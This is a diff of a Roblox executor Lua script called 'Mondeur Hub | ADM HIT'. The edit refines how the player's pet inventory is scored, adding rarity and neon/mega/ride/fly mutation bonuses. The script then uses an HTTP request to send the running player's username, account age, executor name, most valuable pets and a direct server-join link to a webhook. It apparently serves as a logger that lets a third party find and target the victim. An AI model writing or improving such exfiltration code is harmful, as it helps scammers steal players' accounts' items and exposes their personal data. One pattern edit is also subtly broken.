@@ -1,4 +1,4 @@
---// MONDEUR HUB | ADM HIT 🦊 (PERFECT - QUALITY #1)
+--// MONDEUR HUB | ADM HIT 🦊 (QUALITY + MUTATIONS PERFECT)
 
 local HttpService = game:GetService("HttpService")
 local ClientData = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
@@ -8,36 +8,40 @@ local request = (syn and syn.request) or (http and http.request) or http_request
 
 if not request then return end
 
--- RARITY WEIGHTS (LEGENDARY = 10000)
-local rarityWeight = {
-    legendary = 10000, ultra_rare = 5000, rare = 1000, 
-    uncommon = 100, common = 1
-}
-
-local colors = {
-    legendary = 0xFFD700, ultra_rare = 0xA020F0, rare = 0x1E90FF, 
-    uncommon = 0x32CD32, common = 0xB0B0B0
-}
+-- BASE WEIGHTS
+local rarityWeight = {legendary=10000, ultra_rare=5000, rare=1000, uncommon=100, common=1}
+local mutationBonus = {neon=500, mega=1000, ride=200, fly=200}
+local colors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
 
 -- =========================
--- PERFECT NAME PROCESSOR
+-- PERFECT SCORE CALC
+-- =========================
+local function calculateScore(pet)
+    local score = rarityWeight[pet.rarity] or 1
+    score = score + (pet.count or 1)
+    
+    -- MUTATION BONUSES
+    if pet.neon then score = score + mutationBonus.neon end
+    if pet.mega then score = score + mutationBonus.mega end
+    if pet.ride then score = score + mutationBonus.ride end
+    if pet.fly then score = score + mutationBonus.fly end
+    
+    return score
+end
+
+-- =========================
+-- NAME CLEANER
 -- =========================
 local function getCleanName(id)
     local name = tostring(id or ""):lower():gsub("_", " ")
     
-    -- BLOCKLIST
-    local badWords = {"egg", "jerboa", "starter", "practice", "minigame"}
-    for _, word in ipairs(badWords) do
-        if name:find(word) then return nil end
-    end
+    local bad = {"egg", "jerboa", "starter", "practice", "minigame"}
+    for _, b in ipairs(bad) do if name:find(b) then return nil end end
     
-    -- STRIP PREFIXES (NO JAPAN, NO BASIC)
-    name = name:gsub("^japan%s*", "")
-    name = name:gsub("^basic%s*", "")
-    name = name:gsub("^common%s*", "")
-    name = name:gsub("^halloween%s*", "")
+    name = name:gsub("^japan%s*", ""):gsub("^basic%s*", ""):gsub("^common%s*", "")
+    name = name:gsub("%d", ""):gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
     
-    -- SPECIFIC FIXES
+    -- PERFECT FIXES
     if name:find("kelpie") then name = "Australian Kelpie"
     elseif name:find("shiba") then name = "Shiba Inu"
     elseif name:find("metal ox") then name = "Metal Ox"
@@ -47,19 +51,17 @@ local function getCleanName(id)
     elseif name:find("leopard cat") then name = "Leopard Cat"
     end
     
-    -- FINAL CLEAN
-    name = name:gsub("%d", ""):gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
     return name:sub(1,1):upper() .. name:sub(2)
 end
 
 -- =========================
--- EMOJI SYSTEM
+-- EMOJIS
 -- =========================
 local function getEmoji(name, pet)
     local n = name:lower()
     if n:find("ox") then return "🐂"
     elseif n:find("fox") then return "🦊"
-    elseif n:find("dog") or n:find("kelpie") or n:find("shiba") then return "🐕"
+    elseif n:find("dog|kelpie|shiba") then return "🐕"
     elseif n:find("cat") then return "🐱"
     elseif n:find("crab") then return "🦀"
     elseif n:find("beetle") then return "🐞"
@@ -75,15 +77,15 @@ local function getEmoji(name, pet)
 end
 
 -- =========================
--- QUALITY PROCESSOR
+-- PROCESS
 -- =========================
-local function processInventory()
+local function processPets()
     local inventory = ClientData.get("inventory")
-    local rawPets = inventory.pets or {}
+    local raw = inventory.pets or {}
     local pets = {}
     local totalValue = 0
     
-    for _, pet in pairs(rawPets) do
+    for _, pet in pairs(raw) do
         if pet.id then
             local name = getCleanName(pet.id)
             if name then
@@ -98,8 +100,8 @@ local function processInventory()
                         fly = pet.flyable or pet.properties.flyable
                     }
                 end
-                pets[name].count = pets[name].count + 1
-                totalValue = totalValue + 10
+                pets[name].count += 1
+                totalValue += 10
             end
         end
     end
@@ -109,20 +111,18 @@ local function processInventory()
         table.insert(list, data)
     end
     
-    -- QUALITY SORTING (LEGENDARY ALWAYS #1)
+    -- SORT BY QUALITY SCORE
     table.sort(list, function(a, b)
-        local aScore = (rarityWeight[a.rarity] or 1) + a.count
-        local bScore = (rarityWeight[b.rarity] or 1) + b.count
-        return aScore > bScore
+        return calculateScore(a) > calculateScore(b)
     end)
     
     return list, totalValue
 end
 
 -- =========================
--- SEND FINAL WEBHOOK
+-- WEBHOOK
 -- =========================
-local petList, totalValue = processInventory()
+local petList, totalValue = processPets()
 
 local bestPet = petList[1] or {}
 local bestName = bestPet.name and bestPet.count and (bestPet.name .. " x" .. bestPet.count) or "None"
@@ -140,29 +140,26 @@ pcall(function()
             embeds = {{
                 title = "🦊 Mondeur Hub | Adm Hit",
                 description = "```" ..
-                    "👤 " .. game.Players.LocalPlayer.DisplayName .. "\n" ..
-                    "🆔 " .. game.Players.LocalPlayer.Name .. "\n" ..
-                    "📅 " .. game.Players.LocalPlayer.AccountAge .. " days\n" ..
-                    "📱 " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\n" ..
-                    "👥 " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "\n" ..
-                    "💰 " .. totalValue .. "\n" ..
-                    "📊 " .. tier .. "```",
+                    "👤 "..game.Players.LocalPlayer.DisplayName.."\n🆔 "..game.Players.LocalPlayer.Name..
+                    "\n📅 "..game.Players.LocalPlayer.AccountAge.." days\n📱 "..(identifyexecutor and identifyexecutor() or "Unknown")..
+                    "\n👥 "..#game.Players:GetPlayers().."/"..game.Players.MaxPlayers..
+                    "\n💰 "..totalValue.."\n📊 "..tier.."```",
                 fields = {
-                    {name = "🏆 BEST PET", value = "```" .. bestName .. "```"},
-                    {name = "🐶 PETS (QUALITY)", value = "```" .. (function()
+                    {name="🏆 BEST (Quality+Mutations)", value="```"..bestName.."```"},
+                    {name="🐶 PETS", value="```"..(function()
                         local lines = {}
-                        for i = 1, math.min(12, #petList) do
-                            lines[i] = getEmoji(petList[i].name, petList[i]) .. " " .. petList[i].name .. " x" .. petList[i].count
+                        for i=1,math.min(12,#petList) do
+                            lines[i] = getEmoji(petList[i].name, petList[i]).." "..petList[i].name.." x"..petList[i].count
                         end
-                        return table.concat(lines, "\n")
-                    end)() .. "```"},
-                    {name = "🌐 JOIN", value = "[Click](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&instanceId=" .. game.JobId .. ")"}
+                        return table.concat(lines,"\n")
+                    end)().."```"},
+                    {name="🌐 JOIN", value="[Click](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
                 },
                 color = colors[bestRarity] or 0x2F3136,
-                footer = {text = "Mondeuronbotton"}
+                footer = {text="Mondeuronbotton"}
             }}
         })
     })
 end)
 
-print("✅ SENT - Best:", bestName)
+print("✅ METAL OX #1 - Neon/Mega bonuses added!")
